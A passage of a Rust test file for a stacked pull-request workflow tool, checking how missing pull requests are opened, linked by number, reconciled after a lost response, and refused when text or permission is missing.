            posting_budget: PostingBudget::new(10)?,
        })
    }
}

/// Text from each layer's name; `Unknown` for the layers in `unreadable`.
struct Titles(Vec<&'static str>);

impl LayerText for Titles {
    fn pull_request_text(&self, branch: &BranchName) -> Observed<PullRequestText> {
        if self.0.contains(&branch.as_str()) {
            return Observed::Unknown;
        }
        match (
            Text::new(&format!("Work on {branch}")),
            Text::new(&format!("Body of {branch}")),
        ) {
            (Ok(title), Ok(body)) => Observed::Known(PullRequestText { title, body }),
            _ => Observed::Unknown,
        }
    }
}

/// Run `command` for the task on `issue-5`, whose branch has no pull
/// request yet, with `forge` opening missing ones.
fn run_opening(
    setup: &Stacking,
    view: &StackView,
    layers: &Layers,
    forge: &Forge<'_>,
    text: &dyn LayerText,
    command: &StackCommand,
) -> TestResult<(StackOutcome, Recording)> {
    run_opening_with(setup, view, layers, forge, text, command, None)
}

/// [`run_opening`] with the task's push naming `pull_request`.
fn run_opening_with(
    setup: &Stacking,
    view: &StackView,
    layers: &Layers,
    forge: &Forge<'_>,
    text: &dyn LayerText,
    command: &StackCommand,
    pull_request: Option<u64>,
) -> TestResult<(StackOutcome, Recording)> {
    let runner =
        Recording::answering(StackResult::Done)?.with_view(StackResult::Viewed(view.clone()));
    let outcome = StackBoundary {
        opener: Some(LayerOpener {
            forge,
            consent: &Standing,
            text,
        }),
        ..boundary_over(setup, &runner, layers)
    }
    .run(
        &setup.task,
        setup.fence,
        command,
        &PushIntent {
            pull_request: pull_request.map(number).transpose()?,
            expected_remote: Some(commit('d')?),
        },
    )?;
    Ok((outcome, runner))
}

fn boundary_over<'a>(
    setup: &'a Stacking,
    runner: &'a Recording,
    layers: &'a Layers,
) -> StackBoundary<'a> {
    StackBoundary {
        store: &setup.world.fixture.store,
        grants: &setup.world.grants,
        destination: &setup.github,
        clock: &setup.world.clock,
        runner,
        pull_requests: layers,
        remote: layers,
        updater: layers,
        local: layers,
        opener: None,
    }
}

/// `issue-3` and `issue-4` with pull requests, and the task's `issue-5`
/// without one.
fn new_top_layer() -> TestResult<StackView> {
    stack_with_prs(&[
        ("lemarier/issue-3", false, Some(3)),
        ("lemarier/issue-4", false, Some(4)),
        ("lemarier/issue-5", false, None),
    ])
}

fn open_action(name: &str, base: &str, head: char, draft: bool) -> TestResult<GitHubAction> {
    Ok(GitHubAction::OpenPullRequest {
        head: branch(name)?,
        expected_head: commit(head)?,
        base: branch(base)?,
        title: Text::new(&format!("Work on {name}"))?,
        body: Text::new(&format!("Body of {name}"))?,
        draft,
    })
}

fn link_of(numbers: &[u64], ready: bool) -> TestResult<StackLink> {
    Ok(StackLink {
        trunk: branch("main")?,
        pull_requests: numbers
            .iter()
            .map(|value| number(*value))
            .collect::<TestResult<_>>()?,
        ready,
    })
}

#[test]
fn a_new_layer_gets_its_pull_request_opened_after_the_push_and_linked_by_number() -> TestResult {
    let setup = stacking()?;
    let mut layers = Layers::consistent()?;
    let forge = Forge::new(&layers.updated)?;
    let titles = Titles(Vec::new());
    let (outcome, runner) = run_opening(
        &setup,
        &new_top_layer()?,
        &layers,
        &forge,
        &titles,
        &StackCommand::Submit { ready: false },
    )?;
    assert_eq!(outcome, StackOutcome::Ran(StackResult::Done));
    // The tool pushes nothing and links every layer by number.
    assert!(runner.ran().is_empty());
    assert_eq!(runner.linked(), vec![link_of(&[3, 4, 7], false)?]);
    // Opened after the push, based on the layer below, at the pushed head.
    assert_eq!(
        *forge.opened.borrow(),
        vec![(
            open_action("lemarier/issue-5", "lemarier/issue-4", 'd', true)?,
            1
        )]
    );
    // The branch now has a pull request, so a push must name it.
    let (outcome, _) = run_opening(
        &setup,
        &new_top_layer()?,
        &layers,
        &forge,
        &titles,
        &StackCommand::Push,
    )?;
    assert_eq!(
        outcome,
        StackOutcome::Refused(StackRefusal::Push(PushRefusal::PullRequestRequired))
    );
    // A later submission naming it reuses the opened pull request even
    // while the tool's view lacks it.
    layers.pull_requests.insert(
        7,
        Observed::Known(Some(layer_pr(
            7,
            "lemarier/issue-5",
            "lemarier/issue-4",
            'd',
        )?)),
    );
    let (outcome, runner) = run_opening_with(
        &setup,
        &new_top_layer()?,
        &layers,
        &forge,
        &titles,
        &StackCommand::Submit { ready: true },
        Some(7),
    )?;
    assert_eq!(outcome, StackOutcome::Ran(StackResult::Done));
    assert_eq!(runner.linked(), vec![link_of(&[3, 4, 7], true)?]);
    assert_eq!(
        forge.opened.borrow().len(),
        1,
        "opened a second pull request"
    );
    assert_eq!(layers.updated.borrow().len(), 2);
    let record = setup.world.fixture.store.task(&setup.task)?;
    let opened: Vec<_> = record
        .effects()
        .iter()
        .filter(|effect| matches!(effect.request().effect(), Effect::GitHub(_)))
        .map(|effect| matches!(effect.state(), EffectState::Applied { .. }))
        .collect();
    assert_eq!(opened, vec![true]);
    Ok(())
}

#[test]
fn every_missing_layer_is_opened_bottom_to_top_on_the_layer_below() -> TestResult {
    let setup = stacking()?;
    settled_layer(&setup, 7, "lemarier/issue-7")?;
    let mut layers = Layers::consistent()?;
    layers
        .local
        .insert("lemarier/issue-7", Observed::Known(Some(commit('e')?)));
    let forge = Forge::new(&layers.updated)?;
    let view = stack_with_prs(&[
        ("lemarier/issue-3", true, Some(3)),
        ("lemarier/issue-4", false, Some(4)),
        ("lemarier/issue-5", false, None),
        ("lemarier/issue-7", false, None),
    ])?;
    let (outcome, runner) = run_opening(
        &setup,
        &view,
        &layers,
        &forge,
        &Titles(Vec::new()),
        &StackCommand::Submit { ready: false },
    )?;
    assert_eq!(outcome, StackOutcome::Ran(StackResult::Done));
    assert_eq!(
        forge.actions(),
        vec![
            open_action("lemarier/issue-5", "lemarier/issue-4", 'd', true)?,
            open_action("lemarier/issue-7", "lemarier/issue-5", 'e', true)?,
        ]
    );
    assert_eq!(runner.linked(), vec![link_of(&[4, 7, 8], false)?]);
    Ok(())
}

#[test]
fn an_uncertain_open_is_reconciled_to_the_existing_pull_request_not_a_second_one() -> TestResult {
    let setup = stacking()?;
    let mut layers = Layers::consistent()?;
    let forge = Forge::new(&layers.updated)?
        .failing(EffectFailure::Uncertain(UncertainReason::ResponseLost));
    let titles = Titles(Vec::new());
    let submit = StackCommand::Submit { ready: false };
    let (outcome, runner) =
        run_opening(&setup, &new_top_layer()?, &layers, &forge, &titles, &submit)?;
    assert_eq!(
        outcome,
        StackOutcome::Ran(StackResult::OpenUncertain {
            branch: branch("lemarier/issue-5")?
        })
    );
    assert!(runner.linked().is_empty());
    // Retrying before reconciling never submits the open again.
    assert!(run_opening(&setup, &new_top_layer()?, &layers, &forge, &titles, &submit).is_err());
    assert_eq!(forge.opened.borrow().len(), 1);
    // The lookup finds the pull request the lost response opened.
    *forge.found.borrow_mut() = Lookup::Applied(Receipt::new(pull_url(7)?, vec![], vec![])?);
    let report = reconcile(
        &setup.world.fixture.store,
        &forge,
        &setup.task,
        setup.fence,
        &setup.world.clock,
    )?;
    assert_eq!(report.resolved.len(), 1);
    // Linked again only because the forge shows it open where it belongs.
    layers.pull_requests.insert(
        7,
        Observed::Known(Some(layer_pr(
            7,
            "lemarier/issue-5",
            "lemarier/issue-4",
            'd',
        )?)),
    );
    let (outcome, runner) =
        run_opening(&setup, &new_top_layer()?, &layers, &forge, &titles, &submit)?;
    assert_eq!(outcome, StackOutcome::Ran(StackResult::Done));
    assert_eq!(runner.linked(), vec![link_of(&[3, 4, 7], false)?]);
    assert_eq!(
        forge.opened.borrow().len(),
        1,
        "opened a second pull request"
    );
    Ok(())
}

#[test]
fn a_refused_open_stops_the_submission_after_the_push_without_linking() -> TestResult {
    let setup = stacking()?;
    let layers = Layers::consistent()?;
    let forge =
        Forge::new(&layers.updated)?.failing(EffectFailure::NotApplied(NotAppliedReason::Rejected));
    let (outcome, runner) = run_opening(
        &setup,
        &new_top_layer()?,
        &layers,
        &forge,
        &Titles(Vec::new()),
        &StackCommand::Submit { ready: true },
    )?;
    assert_eq!(
        outcome,
        StackOutcome::Ran(StackResult::NotOpened {
            branch: branch("lemarier/issue-5")?,
            reason: NotAppliedReason::Rejected,
        })
    );
    assert_eq!(layers.updated.borrow().len(), 1);
    assert!(runner.linked().is_empty());
    // A refused open created nothing, so running the submission again tries
    // the open again instead of hitting the refused record.
    let (outcome, runner) = run_opening(
        &setup,
        &new_top_layer()?,
        &layers,
        &forge,
        &Titles(Vec::new()),
        &StackCommand::Submit { ready: true },
    )?;
    assert_eq!(outcome, StackOutcome::Ran(StackResult::Done));
    assert_eq!(runner.linked(), vec![link_of(&[3, 4, 8], true)?]);
    assert_eq!(
        forge.actions(),
        vec![
            open_action("lemarier/issue-5", "lemarier/issue-4", 'd', false)?,
            open_action("lemarier/issue-5", "lemarier/issue-4", 'd', false)?,
        ]
    );
    Ok(())
}

#[test]
fn a_submission_that_cannot_open_is_refused_before_any_push() -> TestResult {
    // No text for the new pull request.
    let setup = stacking()?;
    let layers = Layers::consistent()?;
    let forge = Forge::new(&layers.updated)?;
    let (outcome, runner) = run_opening(
        &setup,
        &new_top_layer()?,
        &layers,
        &forge,
        &Titles(vec!["lemarier/issue-5"]),
        &StackCommand::Submit { ready: false },
    )?;
    assert_eq!(
        outcome,
        StackOutcome::Refused(StackRefusal::PullRequestText {
            branch: branch("lemarier/issue-5")?
        })
    );
    // Without the open-pull-request grant, even with an opener.
    let setup = stacking_granted(&[Permission::PushBranch])?;
    let refused = run_opening(
        &setup,
        &new_top_layer()?,
        &layers,
        &forge,
        &Titles(Vec::new()),
        &StackCommand::Submit { ready: false },
    );
    assert!(matches!(
        refused,
        Err(error) if matches!(
            error.downcast_ref::<kitchen::Error>(),
            Some(kitchen::Error::Contract(ContractError::PermissionDenied {
                permission: Permission::OpenPullRequest
            }))
        )
    ));
    assert!(layers.updated.borrow().is_empty(), "pushed");
    assert!(forge.opened.borrow().is_empty(), "opened");
    assert!(runner.linked().is_empty());
    Ok(())
}

#[test]
fn pull_request_text_comes_from_the_head_commit_message() -> TestResult {
    let text =
        PullRequestText::from_commit_message("feat: add x\0Why it matters.\n").ok_or("no text")?;
    assert_eq!(text.title.as_str(), "feat: add x");
    assert_eq!(text.body.as_str(), "Why it matters.");
    // An empty body falls back to the subject.
    let text = PullRequestText::from_commit_message("fix: y\0\n").ok_or("no text")?;
    assert_eq!(text.body.as_str(), "fix: y");
    // A long subject is cut on a character boundary.
    let long = format!("{}é tail", "a".repeat(MAX_TITLE_BYTES - 1));
    let text = PullRequestText::from_commit_message(&long).ok_or("no text")?;
    assert_eq!(text.title.as_str(), "a".repeat(MAX_TITLE_BYTES - 1));
    // No subject, no pull request.
    assert_eq!(PullRequestText::from_commit_message("  \0body"), None);
    Ok(())
}

#[test]
fn a_pull_request_opened_earlier_is_linked_again_only_while_it_still_matches() -> TestResult {
    use kitchen::workflows::stack::OpenedFault;
    // Each case changes #8, which an earlier submission opened for the layer
    // above the task's branch, before a submission whose view lacks it.
    let cases: [ReadsChange; 6] = [
        ("still open", |_| {}, None),
        (
            "closed",
            |layers| {
                edit_pr(layers, 8, |pr| pr.state = PullRequestState::Closed);
            },
            Some(OpenedFault::NotOpen(PullRequestState::Closed)),
        ),
        (
            "retargeted",
            |layers| edit_pr(layers, 8, |pr| pr.base_branch = "main".to_owned()),
            Some(OpenedFault::BaseChanged),
        ),
        (
            "replaced",
            |layers| {
                edit_pr(layers, 8, |pr| pr.state = PullRequestState::Closed);
                if let Ok(replacement) = layer_pr(9, "lemarier/issue-7", "lemarier/issue-5", 'e') {
                    layers.insert(9, Observed::Known(Some(replacement)));
                }
            },
            Some(OpenedFault::NotOpen(PullRequestState::Closed)),
        ),
        (
            "gone",
            |layers| {
                layers.insert(8, Observed::Known(None));
            },
            Some(OpenedFault::Missing),
        ),
        (
            "unreadable",
            |layers| {
                layers.insert(8, Observed::Unknown);
            },
            Some(OpenedFault::Unreadable),
        ),
    ];
    for (name, change, fault) in cases {
        let setup = stacking()?;
        settled_layer(&setup, 7, "lemarier/issue-7")?;
        let mut layers = Layers::consistent()?;
        layers
            .local
            .insert("lemarier/issue-7", Observed::Known(Some(commit('e')?)));
        let forge = Forge::new(&layers.updated)?;
        let titles = Titles(Vec::new());
        let submit = StackCommand::Submit { ready: false };
        let view = stack_with_prs(&[
            ("lemarier/issue-3", false, Some(3)),
            ("lemarier/issue-4", false, Some(4)),
            ("lemarier/issue-5", false, None),
            ("lemarier/issue-7", false, None),
        ])?;
        let (outcome, _) = run_opening(&setup, &view, &layers, &forge, &titles, &submit)?;
        assert_eq!(outcome, StackOutcome::Ran(StackResult::Done), "{name}");
        // Both are open where the first submission put them.
        for (number_, pr) in [
            (7, layer_pr(7, "lemarier/issue-5", "lemarier/issue-4", 'd')?),
            (8, layer_pr(8, "lemarier/issue-7", "lemarier/issue-5", 'e')?),
        ] {
            layers
                .pull_requests
                .insert(number_, Observed::Known(Some(pr)));
        }
        layers
            .remote
            .insert("lemarier/issue-7", Observed::Known(Some(commit('e')?)));
        change(&mut layers.pull_requests);
        let view = stack_with_prs(&[
            ("lemarier/issue-3", false, Some(3)),
            ("lemarier/issue-4", false, Some(4)),
            ("lemarier/issue-5", false, Some(7)),
            ("lemarier/issue-7", false, None),
        ])?;
        let (outcome, runner) =
            run_opening_with(&setup, &view, &layers, &forge, &titles, &submit, Some(7))?;
        match fault {
            None => {
                assert_eq!(outcome, StackOutcome::Ran(StackResult::Done), "{name}");
                assert_eq!(runner.linked(), vec![link_of(&[3, 4, 7, 8], false)?]);
                assert_eq!(layers.updated.borrow().len(), 2, "{name}");
            }
            Some(fault) => {
                assert_eq!(
                    outcome,
                    StackOutcome::Refused(StackRefusal::OpenedPullRequest {
                        branch: branch("lemarier/issue-7")?,
                        number: number(8)?,
                        fault,
                    }),
                    "{name}"
                );
                assert!(runner.linked().is_empty(), "{name} linked");
                assert_eq!(layers.updated.borrow().len(), 1, "{name} pushed");
            }
        }
        assert_eq!(forge.opened.borrow().len(), 2, "{name} opened another");
    }
    Ok(())
}

#[test]
fn a_reused_pull_request_not_at_the_pushed_head_is_not_linked() -> TestResult {
    use kitchen::workflows::stack::OpenedFault;
    let setup = stacking()?;
    settled_layer(&setup, 7, "lemarier/issue-7")?;
    let mut layers = Layers::consistent()?;
    layers
        .local
        .insert("lemarier/issue-7", Observed::Known(Some(commit('e')?)));
    let forge = Forge::new(&layers.updated)?;
    let titles = Titles(Vec::new());
    let submit = StackCommand::Submit { ready: false };
    let view = stack_with_prs(&[
        ("lemarier/issue-3", false, Some(3)),
        ("lemarier/issue-4", false, Some(4)),
        ("lemarier/issue-5", false, None),
        ("lemarier/issue-7", false, None),
    ])?;
    run_opening(&setup, &view, &layers, &forge, &titles, &submit)?;
    layers.pull_requests.insert(
        7,
        Observed::Known(Some(layer_pr(
            7,
            "lemarier/issue-5",
            "lemarier/issue-4",
            'd',
        )?)),
    );
    // Someone else's commit reached the layer's pull request after the push.
    layers.pull_requests.insert(
        8,
        Observed::Known(Some(layer_pr(
            8,
            "lemarier/issue-7",
            "lemarier/issue-5",
            'f',
        )?)),
    );
    layers
        .remote
        .insert("lemarier/issue-7", Observed::Known(Some(commit('e')?)));
    let view = stack_with_prs(&[
        ("lemarier/issue-3", false, Some(3)),
        ("lemarier/issue-4", false, Some(4)),
        ("lemarier/issue-5", false, Some(7)),
        ("lemarier/issue-7", false, None),
    ])?;
    let (outcome, runner) =
        run_opening_with(&setup, &view, &layers, &forge, &titles, &submit, Some(7))?;
    assert_eq!(
        outcome,
        StackOutcome::Ran(StackResult::OpenedPullRequest {
            branch: branch("lemarier/issue-7")?,
            number: number(8)?,
            fault: OpenedFault::HeadMoved,
        })
    );
    assert_eq!(layers.updated.borrow().len(), 2);
    assert!(runner.linked().is_empty());
    assert_eq!(forge.opened.borrow().len(), 2);
    Ok(())
}

type PullRequestReads = BTreeMap<u64, Observed<Option<PullRequestView>>>;

/// A named change to pull-request reads and the fault it must cause, if any.
type ReadsChange = (
    &'static str,
    fn(&mut PullRequestReads),
    Option<kitchen::workflows::stack::OpenedFault>,
);

fn edit_pr(reads: &mut PullRequestReads, number_: u64, change: impl FnOnce(&mut PullRequestView)) {
    if let Some(Observed::Known(Some(view))) = reads.get_mut(&number_) {
        change(view);
    }
}
